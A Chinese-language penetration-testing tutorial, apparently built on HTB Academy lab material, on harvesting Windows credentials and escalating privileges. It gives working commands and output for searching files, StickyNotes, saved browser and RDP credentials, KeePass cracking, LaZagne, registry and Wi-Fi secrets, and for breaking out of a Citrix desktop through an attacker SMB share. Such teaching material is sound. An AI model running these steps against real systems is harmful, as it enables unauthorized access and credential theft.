<p>还有许多其他类型的文件，我们可以在本地系统或网络共享驱动器上找到，这些文件可能包含凭证或可用于权限提升的信息。在 Active Directory 环境中，我们可以使用类似 Snaffler 的工具来扫描网络共享，寻找有趣的文件扩展名，例如 .kdbx、.vmdk、.vdhx、.ppk 等。我们可能会找到可以挂载并提取本地管理员密码哈希的虚拟硬盘，或可用于访问其他系统的 SSH 私钥，或者用户将密码存储在 Excel/Word 文档、OneNote 或经典的 passwords.txt 文件中。在很多渗透测试中，一个在共享盘或本地盘中找到的密码就足以实现初始访问或权限提升。很多公司会给每个员工分配一个共享文件夹（例如 FILE01 上的用户目录 bjones），并设置较宽松的权限（例如所有域用户都可读）。用户往往会在这些文件夹中存储敏感信息，而不知道这些数据对整个网络都是可见的。</p>
<p><strong>手动在文件系统中搜索凭证</strong></p>
<p>我们可以使用以下命令手动搜索文件系统或共享驱动器中的内容。</p>
<pre><code>C:\htb&gt; cd c:\Users\htb-student\Documents &amp; findstr /SI /M "password" *.xml *.ini *.txt

stuff.txt
</code></pre>
<p>示例 2：</p>
<pre><code>C:\htb&gt; findstr /si password *.xml *.ini *.txt *.config

stuff.txt:password: l#-x9r11_2_GL!</code></pre>
<p>示例 3：</p>
<pre><code>C:\htb&gt; findstr /spin "password" _._
 
stuff.txt:1:password: l#-x9r11_2_GL!</code></pre>
<p><strong>使用 PowerShell 搜索文件内容</strong> 我们也可以用 PowerShell 以多种方式进行搜索，下面是一个示例：</p>
<pre><code>PS C:\htb&gt; select-string -Path C:\Users\htb-student\Documents*.txt -Pattern password

stuff.txt:1:password: l#-x9r11_2_GL!</code></pre>
<p>搜索特定文件扩展名 - 示例 1：</p>
<pre><code>C:\htb&gt; dir /S /B _pass_.txt == _pass_.xml == _pass_.ini == _cred_ == _vnc_ == _.config_

c:\inetpub\wwwroot\web.config</code></pre>
<p>搜索特定文件扩展名 - 示例 2：</p>
<pre><code>C:\htb&gt; where /R C:\ *.config

c:\inetpub\wwwroot\web.config</code></pre>
<p>同样，我们也可以使用如下命令搜索特定扩展名的文件：</p>
<pre><code>PS C:\htb&gt; Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore</code></pre>
<p><strong>便签（Sticky Notes）中的密码</strong></p>
<p>人们经常使用 Windows 的 StickyNotes 应用来保存密码和其他信息，却不知道它实际上是一个数据库文件。该文件位于：</p>
<pre><code>PS C:\htb&gt; Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore


    Directory: C:\inetpub\wwwroot


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021   9:59 AM            329 web.config

&lt;SNIP&gt;




    Directory: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ASP.NETWebAdminFiles


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/7/2019   1:12 AM           1040 web.config
</code></pre>
<p><strong>查找 StickyNotes 数据库文件：</strong> 人们经常在 Windows 工作站上使用 StickyNotes 应用来保存密码和其他信息，却没意识到它是一个数据库文件。这个文件位于， <code>C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</code> 值得搜索和检查。</p>
<ul><li>寻找便签数据库文件</li></ul>
<pre><code>PS C:\htb&gt; ls
 
 
    Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal</code></pre>
<p>我们可以把三个 <code>plum.sqlite*</code> 文件复制到系统，用 DB 浏览器等 SQLite 工具打开，通过查询<code>select Text from Note;</code> 查看 Note 表中的 <code>Text</code> 列。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322052414.png" alt="Pasted image 20260322052414" />
<p><strong>使用 PowerShell 查看便签数据</strong> 这也可以用 PowerShell 的 PSSQLite 模块完成。首先，导入模块，指向一个数据源（这里指 StickNotes 应用使用的 SQLite 数据库文件），最后查询 <code>Note</code> 表，寻找任何有趣的数据。这也可以在我们的攻击机器上下载 <code>.sqlite</code> 文件后完成，或者远程通过 WinRM 完成。</p>
<pre><code class="language-powershell">PS C:\htb&gt; Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\htb&gt; cd .\PSSQLite\
PS C:\htb&gt; Import-Module .\PSSQLite.psd1
PS C:\htb&gt; $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb&gt; Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am</code></pre>
<p><strong>用于查看数据库文件内容的字符串</strong> 我们也可以把它们复制到攻击框，用<code>字符串</code>命令搜索数据，这取决于数据库大小，效率可能较低。</p>
<pre><code class="language-powershell">Chenduoduo@htb[/htb]$  strings plum.sqlite-wal

CREATE TABLE "Note" (
"Text" varchar ,
"WindowPosition" varchar ,
"IsOpen" integer ,
"IsAlwaysOnTop" integer ,
"CreationNoteIdAnchor" varchar ,
"Theme" varchar ,
"IsFutureNote" integer ,
"RemoteId" varchar ,
"ChangeKey" varchar ,
"LastServerVersion" varchar ,
"RemoteSchemaVersion" integer ,
"IsRemoteDataInvalid" integer ,
"PendingInsightsScan" integer ,
"Type" varchar ,
"Id" varchar primary key not null ,
"ParentId" varchar ,
"CreatedAt" bigint ,
"DeletedAt" bigint ,
"UpdatedAt" bigint )'
indexsqlite_autoindex_Note_1Note
af907b1b-1eef-4d29-b238-3ea74f7ffe5caf907b1b-1eef-4d29-b238-3ea74f7ffe5c
U   af907b1b-1eef-4d29-b238-3ea74f7ffe5c
Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c
U   93b49900-6530-42e0-b35c-2663989ae4b3


&lt; SNIP &gt;

\id=011f29a4-e37f-451d-967e-c42b818473c2 vCenter
\id=34910533-ddcf-4ac4-b8ed-3d1f10be9e61 alright*
\id=ffaea2ff-b4fc-4a14-a431-998dc833208c root:Vc3nt3R_adm1n!ManagedPosition=Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c

&lt;SNIP &gt;</code></pre>
<p><strong>其他相关档案</strong> 我们可能还能在以下文件中找到凭证：</p>
<pre><code class="language-shellsession">%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*</code></pre>
<h3>进一步的凭证盗窃</h3>
<p>列出已保存的凭证 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey" target="_blank" rel="noreferrer">cmdkey</a> 命令可用于创建、列出和删除存储的用户名和密码。用户可能希望为特定主机存储凭证，或用于终端服务连接的凭证，以便通过远程桌面连接到远程主机，无需输入密码。这可能帮助我们横向迁移到拥有不同用户的系统，或者提升当前主机的权限，利用其他用户存储的凭证。</p>
<ol><li><strong>Cmdkey 已保存的凭据</strong></li></ol>
<pre><code>C:\htb&gt; cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob</code></pre>
<p>当我们尝试向主机进行 RDP 访问时，保存的凭证会被使用。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322055123.png" alt="Pasted image 20260322055123" />
<p>我们也可以尝试用 <code>runas</code> 重用凭证，以该用户身份发送反向 shell，运行二进制文件，或用以下命令启动 PowerShell 或 CMD 控制台：</p>
<p>以其他用户身份执行命令</p>
<pre><code>PS C:\htb&gt; runas /savecred /user:inlanefreight\bob "COMMAND HERE"</code></pre>
<p>从 Chrome 中获取已保存的凭据 用户通常会在浏览器中存储他们经常访问的应用程序的凭证。我们可以使用像 <a href="https://github.com/GhostPack/SharpDPAPI" target="_blank" rel="noreferrer">SharpChrome</a> 这样的工具，从 Google Chrome 中获取 cookie 和保存的登录信息。</p>
<ol><li><strong>Browser Credentials  浏览器凭证</strong></li></ol>
<pre><code>PS C:\htb&gt; .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0


[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0


--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1</code></pre>
<p>注意：基于 Chromium 的浏览器收集凭证通常会产生额外事件，蓝队可以记录并识别，如 <code>4688</code>（进程创建）和 <code>16385</code>（DPAPI 活动）;防御者还可以考虑文件系统/对象访问事件，如 <code>4662</code>（对象访问）和 <code>4663</code>（文件访问），以提高检测精度。</p>
<p>许多公司为用户提供密码管理器。这可以是桌面应用程序如 <code>KeePass</code>，云端解决方案如 <code>1Password</code>，或企业密码库如 <code>Thycotic</code> 或 <code>CyberArk</code>。获取密码管理器的访问权限，尤其是 IT 人员或整个部门使用的密码管理器，可能导致管理员级别访问高价值目标，如网络设备、服务器、数据库等。我们可能通过密码重用或猜测弱密码/常见密码来访问密码库。一些密码管理器，如 <code>KeePass</code>，存储在主机本地。如果我们在服务器、工作站或文件共享中发现.<code>kdbx</code> 文件，就知道我们面对的是 <code>KeePass</code> 数据库，通常仅靠主密码保护。如果我们能向攻击主机下载 <code>.kdbx</code> 文件，可以使用 <a href="https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py" target="_blank" rel="noreferrer">keepass2john</a> 等工具提取密码哈希值，并通过密码破解工具如 <a href="https://github.com/hashcat" target="_blank" rel="noreferrer">Hashcat</a> 或 <a href="https://github.com/openwall/john" target="_blank" rel="noreferrer">John the Ripper</a> 进行处理。</p>
<ol><li><strong>Password Managers  密码管理器</strong></li></ol>
<p>提取 KeePass 哈希 首先，我们用 <code>keepass2john.py</code> 脚本提取 Hashcat 格式的哈希值。</p>
<pre><code>Chenduoduo@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154</code></pre>
<p>离线破解哈希 然后我们可以将哈希输入 Hashcat，KeePass 的哈希模式为 13400。如果成功，我们可能获得大量凭证，用于访问其他应用/系统，甚至网络设备、服务器、数据库等，前提是我们能访问 IT 人员使用的密码数据库。</p>
<pre><code>Chenduoduo@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) starting...

&lt;SNIP&gt;

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)
Hash.Target......: $keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d...39c154
Time.Started.....: Fri Aug  6 11:17:47 2021 (22 secs)
Time.Estimated...: Fri Aug  6 11:18:09 2021 (0 secs)
Guess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      276 H/s (4.79ms) @ Accel:1024 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59984-60000
Candidates.#1....: 123456 -&gt; iheartyou

Started: Fri Aug  6 11:17:45 2021
Stopped: Fri Aug  6 11:18:11 2021</code></pre>
<p>如果我们访问了拥有 Microsoft Exchange 收件箱的域名用户的域名加入系统，可以使用 <a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noreferrer">MailSniper</a> 工具尝试搜索用户邮箱中的“pass”、“creds”、“credentials”等词汇。</p>
<ol><li><strong>Email</strong></li></ol>
<p>当一切都失败时，我们可以运行 <a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noreferrer">LaZagne</a> 工具，尝试从各种软件中获取凭证。此类软件包括网页浏览器、聊天客户端、数据库、电子邮件、内存转储、各种系统管理工具以及内部密码存储机制（如 Autologon、Credman、DPAPI、LSA 秘密等）。该工具可用于运行所有模块、特定模块（如数据库），或针对特定软件（如 OpenVPN）。输出可以保存为标准文本文件或 JSON 格式。我们试试看吧。</p>
<ol><li>更多关于credentials</li></ol>
<p>我们可以查看带有 <code>-h</code> 标志的帮助菜单。</p>
<ul><li>查看 LaZagne 帮助菜单</li></ul>
<pre><code>PS C:\htb&gt; .\lazagne.exe -h

usage: lazagne.exe [-h] [-version]
                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                   ...
                   
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

positional arguments:
  {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                        Choose a main command
    chats               Run chats module
    mails               Run mails module
    all                 Run all modules
    git                 Run git module
    svn                 Run svn module
    windows             Run windows module
    wifi                Run wifi module
    maven               Run maven module
    sysadmin            Run sysadmin module
    browsers            Run browsers module
    games               Run games module
    multimedia          Run multimedia module
    memory              Run memory module
    databases           Run databases module
    php                 Run php module

optional arguments:
  -h, --help            show this help message and exit
  -version              laZagne version</code></pre>
<p>运行所有 LaZagne 模块 正如我们所见，我们有许多模块可供选择。运行<code>该工具</code>后，将搜索支持的应用程序并返回发现的明文凭据。正如下面的例子所示，许多应用程序并未安全存储凭证（最好永远不要存储凭证！）。它们可以轻松检索并用于本地升级权限、迁移到其他系统或访问敏感数据。</p>
<pre><code>PS C:\htb&gt; .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1

[+] 2 passwords have been found.

For more information launch it again with the -v option

elapsed time = 5.50499987602</code></pre>
<p>我们可以使用 <a href="https://github.com/Arvanaghi/SessionGopher" target="_blank" rel="noreferrer">SessionGopher</a> 提取保存的 PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP 凭证。该工具用 PowerShell 编写，能够搜索并解密存储的登录信息，用于远程访问工具。它可以本地运行，也可以远程运行。它会搜索 <code>HKEY_USERS</code> 蜂箱中所有登录过域加入（或独立）主机的用户，并搜索并解密任何保存的会话信息。它还可以用于搜索 PuTTY 私钥文件（.ppk）、远程桌面（.rdp）和 RSA（.sdtid）文件。</p>
<ol><li>进一步的credentials</li></ol>
<p>作为当前用户运行 SessionGopher 我们需要本地管理员权限来获取 <code>HKEY_USERS</code> 中每个用户存储的会话信息，但作为当前用户运行一下，看看是否能找到有用的凭据总是值得的。</p>
<pre><code>PS C:\htb&gt; Import-Module .\SessionGopher.ps1
 
PS C:\Tools&gt; Invoke-SessionGopher -Target WINLPE-SRV01
 
          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     \`m..m       Twitter: @arvanaghi | arvanaghi.com
 
[+] Digging on WINLPE-SRV01...
WinSCP Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :
 
 
PuTTY Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local
 

 
SuperPuTTY Sessions
 
 
Source        : WINLPE-SRV01\htb-student
SessionId     : NIX03
SessionName   : NIX03
Host          : nix03.inlanefreight.local
Username      : srvadmin
ExtraArgs     :
Port          : 22
Putty Session : Default Settings
</code></pre>
<p>某些程序和 Windows 配置可能导致注册表中存储明文密码或其他数据。虽然 <code>Lazagne</code> 和 <code>SessionGopher</code> 等工具是提取凭据的好方法，但作为渗透测试人员，我们也应熟悉并熟悉手动枚举凭证。</p>
<ol><li>注册表中的明文密码存储</li></ol>
<p>Windows <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon" target="_blank" rel="noreferrer">Autologon</a> 是一项功能，允许用户配置其 Windows 操作系统自动登录特定用户账户，无需每次启动时手动输入用户名和密码。然而，一旦配置好，用户名和密码会以明文形式存储在注册表中。此功能通常用于单用户系统或在便利性大于安全性需求的情况下。</p>
<ul><li>Windows AutoLogon</li></ul>
<p>与 Autologon 相关的注册表密钥可在以下蜂箱的 <code>HKEY_LOCAL_MACHINE</code> 中找到，标准用户可以访问：</p>
<pre><code class="language-cmd">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
NT\CurrentVersion\Winlogon</code></pre>
<p>账户的典型配置涉及手动设置以下注册表密钥：</p>
<p><code>AdminAutoLogon</code>——判断 Autologon 是否被启用或禁用。值为“1”表示已启用。</p>
<p><code>DefaultUserName</code> - 保存将自动登录账户的用户名值。</p>
<p><code>DefaultPassword</code> - 保存之前指定用户账户密码的数值。</p>
<ul><li><code>AdminAutoLogon</code> - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.</li><li><code>DefaultUserName</code> - Holds the value of the username of the account that will automatically log on.</li><li><code>DefaultPassword</code> - Holds the value of the password for the user account specified previously.</li></ul>
<ul><li>用 reg.exe 枚举 Autologon</li></ul>
<pre><code>C:\htb&gt;reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    &lt;SNIP&gt;
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
</code></pre>
<p><strong><code>注意：</code></strong> 如果你非得为 Windows 系统配置 Autologon，建议使用 Sysinternals suite中的 Autologon.exe，它会将密码加密为 LSA 秘密。</p>
<p>对于使用代理连接的 Putty 会话，保存会话后，凭据以明文形式存储在注册表中。</p>
<ol><li><strong>Putty</strong></li></ol>
<pre><code>Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\&lt;SESSION NAME&gt;</code></pre>
<p>请注意，该注册表密钥的访问控制绑定在配置并保存会话的用户账户上。因此，要查看该账户，我们需要以该用户身份登录并搜索 <code>HKEY_CURRENT_USER</code> 蜂箱。随后，如果我们拥有管理员权限，就能在 <code>HKEY_USERS</code> 中对应用户的蜂巢中找到它。</p>
<p>首先，我们需要列举可用的保存会话：</p>
<ul><li>列举会议次数与查找资质：</li></ul>
<pre><code>PS C:\htb&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh</code></pre>
<p>接下来，我们查看发现的会话“<code>kali%20ssh</code>”的键和值：</p>
<pre><code>PS C:\htb&gt; reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  &lt;SNIP&gt;
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!</code></pre>
<p>在这个例子中，我们可以想象 IT 管理员为其环境中的用户配置了 Putty，但不幸地在代理连接中使用了管理员凭证。密码可以被提取，并可能在网络中重复使用。</p>
<ol><li>Wifi Passwords</li></ol>
<p>如果我们用无线网卡获得用户工作站的本地管理员权限，可以列出他们最近连接过的任何无线网络。</p>
<ul><li>查看已保存的无线网络</li></ul>
<pre><code>C:\htb&gt; netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    &lt;None&gt;

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp</code></pre>
<p>根据网络配置，我们可以获取预共享密钥（见下方<code>密钥</code>内容），并有可能访问目标网络。虽然罕见，但我们可能会在交战中遇到这种情况，并利用这些访问跳转到另一个无线网络，获得更多资源。</p>
<ul><li>获取已保存的无线密码</li></ul>
<pre><code>C:\htb&gt; netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default</code></pre>
<h2>Citrix 受限环境突破</h2>
<p>许多组织利用虚拟化平台，如终端服务、Citrix、AWS AppStream、CyberArk PSM 和自助终端，提供远程访问解决方案以满足其业务需求。然而，在大多数组织中，桌面环境会实施“锁定”措施，以最大限度地减少恶意员工和被入侵账户对整体域名安全的潜在影响。虽然这些桌面限制可能阻碍威胁行为者，但他们仍有可能“突破”受限环境。</p>
<p>Breakout基础方法：</p>
<p>进入<code>对话框</code> 。</p>
<p>利用对话框实现<code>命令执行</code> 。</p>
<p><code>升级权限</code>以获得更高级别的访问权限。</p>
<ol><li>Gain access to a <code>Dialog Box</code>.</li><li>Exploit the Dialog Box to achieve <code>command execution</code>.</li><li><code>Escalate privileges</code> to gain higher levels of access.</li></ol>
<p>在某些仅实施最低限度硬化的环境中，开始菜单甚至可能有一个标准快捷方式可以 <code>cmd.exe</code>，这可能会帮助未授权访问。然而，在高度限制的<code>封锁</code>环境中，任何试图在开始菜单中寻找“cmd.exe”或“powershell.exe”都不会有任何结果。同样，通过文件资源管理器访问 <code>C：\Windows\system32</code> 会触发错误，阻止直接访问关键系统工具。在如此受限的环境中获得“CMD/命令提示符”访问权限是一项显著成就，因为它提供了对操作系统的广泛控制。这种控制层级使攻击者能够收集有价值的信息，促进权限的进一步升级。</p>
<p>有许多技术可以用来突破 Citrix 环境。本节不会涵盖所有可能的场景，但我们将介绍最常见的 Citrix 分组方法。</p>
<p>使用生成目标的 RDP 会话访问 <code>http://humongousretail.com/remote/</code> ，并使用下方提供的凭证登录。登录后，点击<code>默认桌面</code>获取 Citrix <code>launch.ica</code> 文件，以便连接到受限环境。</p>
<pre><code>Username: pmorgan
Password: Summer1Summer!
  Domain: htb.local
  
Import-Module C:\Users\pmorgan\Desktop\PowerUp.ps1  
Get-RegistryKeyValue -Key 'HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer' -ValueName 'AlwaysInstallElevated'  
Get-RegistryKeyValue -Key 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' -ValueName 'AlwaysInstallElevated'

</code></pre>
<h3>绕过路径限制</h3>
<p>当我们尝试使用文件资源管理器访问 <code>C：\Users</code> 时，发现它被限制，并出现错误。这表明组策略已被实施，限制用户使用文件资源管理器浏览 <code>C：\</code> 盘中的目录。在这种情况下，可以利用 Windows 对话框绕过组策略施加的限制。一旦获得 Windows 对话框，下一步通常是导航到包含本地可执行文件的文件夹路径，这些可执行文件提供交互式控制台访问（即：cmd.exe）。通常，我们可以直接在文件名字段输入文件夹路径，从而访问该文件。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063450.png" alt="Pasted image 20260322063450" />
<p>通过 Citrix 部署的众多桌面应用程序都具备与操作系统文件交互的功能。诸如保存、另存为、打开、加载、浏览、导入、导出、帮助、搜索、扫描和打印等功能，通常为攻击者提供调用 Windows 对话框的机会。在 Windows 中，使用绘画、记事本、文字板等工具打开对话框有多种方式。本节我们将以 <code>MS Paint</code> 为例。</p>
<p>从开始菜单运行<code>绘画</code> ，点击 <code>“文件 &gt; 打开</code> ”以打开对话框。</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260322063517.png" alt="Pasted image 20260322063517" />
<p>打开 Windows 绘制对话框后，我们可以在文件名字段下输入 <a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths" target="_blank" rel="noreferrer">UNC</a> 路径 <code>\\127.0.0.1\c$\users\pmorgan</code>，并将 File-Type 设置为<code>所有文件</code> ，按下回车后即可访问所需的目录。</p>
<h3>从受限环境中访问 SMB 共享</h3>
<p>由于设置了限制，文件资源管理器不允许直接访问攻击者机器上的 SMB 共享，也不能访问托管 Citrix 环境的 Ubuntu 服务器。不过，通过在 Windows 对话框中使用 UNC 路径，可以绕过这一限制。这种方法可用于促进从另一台计算机传输文件。</p>
<p>用 Impacket的 <code>smbserver.py</code> 脚本从 Ubuntu 机器启动 SMB 服务器。</p>
<pre><code>root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed</code></pre>
<p>回到 Citrix 环境，通过开始菜单启动“绘图”应用。进入“文件”菜单，选择“打开”，提示对话框出现。在这个与 Paint 相关的 Windows 对话框中，输入 UNC 路径为 <code>\\10.13.38.95\share</code>，输入指定的“文件名”字段。确保文件类型参数设置为“所有文件”。按下“回车”键即可进入该股份。</p>
<p>由于文件资源管理器内部存在限制，直接复制文件不可行。不过，另一种方法是右<code>键点击</code>可执行文件，然后启动它们。右键点击 <code>pwn.exe</code> 二进制文件并选择 <code>“打开</code> ”，这应该会提示我们运行它，并会打开一个命令控制台。</p>
